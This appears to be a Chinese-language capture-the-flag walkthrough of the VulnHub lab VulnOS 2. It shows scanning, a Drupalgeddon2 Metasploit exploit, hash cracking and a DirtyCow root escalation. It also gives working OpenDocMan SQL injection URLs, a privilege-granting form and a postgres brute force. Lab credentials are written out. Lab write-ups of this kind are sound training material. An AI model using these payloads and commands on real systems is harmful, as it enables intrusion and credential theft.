# VulnOS: 2

https://www.vulnhub.com/entry/vulnos-2,147/

difficulty: not know

Finish Date：2024-4-17

## IP

192.168.10.166

## Scan

Open Port -> 22,80,6667

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f54dc8e78bc1b2119524fd0e4c3c3b3b (DSA)
|   2048 ff19337ac1eeb5d0dc6651daf06efc48 (RSA)
|   256 aed76fcced4a828be866a5117a115f86 (ECDSA)
|_  256 71bc6b7b5602a48ece1c8ea61e3a3794 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc?
|_irc-info: Unable to open connection
```

先对根目录进行扫描，看是否有隐藏目录，没有发现信息。访问 web 80，页面上有一些信息，然后指示我们访问 http://192.168.10.166/jabc/ 进行测试。

whatweb http://192.168.10.166/jabc/?q=node/1 发现目标网站是 Drupal 7 搭建的。访问 http://192.168.10.166/jabc/robots.txt 发现了一些隐藏的关键目录。

登陆页面为：http://192.168.10.166/jabc/?q=user/login/

在 msf 中找到了相关漏洞利用的 exploit：unix/webapp/drupal_drupalgeddon2 进行相关参数设置后 run，得到了 meterpreter，继续进行测试提升到 root 权限。

从 meterpreter 进入到 shell 后，先升级下 tty : python -c 'import pty; pty.spawn("/bin/bash")'

上传 linpeas 进行系统枚举：发现内核版本为 3.13.0-24-generic 可能存在内核漏洞。

找到了 Drupal 连接数据库的配置文件：/var/www/html/jabc/sites/default/dbconfig.php 内容为：

```
$databases['default']['default'] = array(
	'driver' => 'mysql',
	'database' => 'drupal7',
	'username' => 'drupal7',
	'password' => 'toor',
	'host' => 'localhost',
	'port' => '',
	'prefix' => ''
);
```

进入到数据库后，查看 user 表中有一条数据记录，用户名：webmin 密码：`$S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug`，尝试破解这个哈希值 john --single hash ，得到明文密码：webmin1980。

看到 /home 目录下有两个用户：vulnosadmin 和 webmin，上面得到的明文密码很有可能就是 webmin 的密码，尝试进行登陆，果然登陆成功。

经过一些列信息枚举，没有发下可以直接利用的信息，只好尝试内核漏洞进行提权，根据筛选出来的信息，使用了脏牛提权：https://www.exploit-db.com/download/40847

经过编译 cpp 代码后，执行获得了 root 权限：

```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s

root@VulnOSv2:~# cat flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.
```

## 拓展方法

在 http://192.168.10.166/jabc/?q=node/7 页面中，查看源代码，发现了另外一个隐藏的目录 /jabcd0cs/ ：

```
Documentation
Dear customer,
For security reasons, this section is hidden.
For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest
Thank you.
```

访问这个目录 /jabcd0cs/ 后，发现了另外一个系统 OpenDocMan v1.2.7，对此系统进行搜索，看能否找到对应的漏洞：

```
OpenDocMan 1.2.7 - Multiple Vulnerabilities 32075.txt

1) SQL Injection in OpenDocMan: CVE-2014-1945

http://192.168.10.166/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9

2) Improper Access Control in OpenDocMan: CVE-2014-1946

<form action="http://[host]/signup.php" method="post" name="main">
<input type="hidden" name="updateuser" value="1">
<input type="hidden" name="admin" value="1">
<input type="hidden" name="id" value="[USER_ID]">
<input type="submit" name="login" value="Run">
</form>
```

根据 SQL 注入漏洞，尝试获得数据库中的用户名：

```
http://192.168.10.166/jabcd0cs/ajax_udf.php?q=-11&add_value=odm_user%20UNION%20SELECT%201,username,3,4,5,6,7,8,9%20from%20odm_user

http://192.168.10.166/jabcd0cs/ajax_udf.php?q=-11&add_value=odm_user%20UNION%20SELECT%201,CONCAT_WS(username,',',password),3,4,5,6,7,8,9%20from%20odm_user
```

得到了对应账户和哈希密码：

```
webmin:b78aae356709f8c31118ea613980954b   <-- webmin1980
guest:084e0343a0486ff05530df6c705c8bb4    <-- guest
```

对应的找到了密码的明文，尝试是否能通过 ssh 登陆系统，结果发现 webmin:webmin1980 能够登陆系统，后续的提权方式跟上面一样。

进入系统后发现本地监听了 127.0.0.1:5432 是 postgres 数据库，不知道这里面有没有信息，能不能得到用户名和密码，但是只能从本地进行连接，需要将端口开放给我们的 kali，可以利用 ssh 进行本地端口转发：

```
ssh webmin@192.168.10.166 -L 5432:localhost:5432
```

使用了 msf 的 scanner/postgres/postgres_login 进行用户名和密码爆破，最后找到了登陆凭证：postgres:postgres，继续获得数据库中的信息：

```
pg_dumpall -h 127.0.0.1 -p 5432 -U postgres -W > pg.sql
```

得到了新的用户名和密码：vulnosadmin:c4nuh4ckm3tw1c3，继续尝试用这个新的用户凭据去 ssh 登陆系统，发现目录下有一个 r00t.blend 文件，让我们用 blend 在线浏览打开它，在里面能看到 root 用户的密码：ab12fg//drg
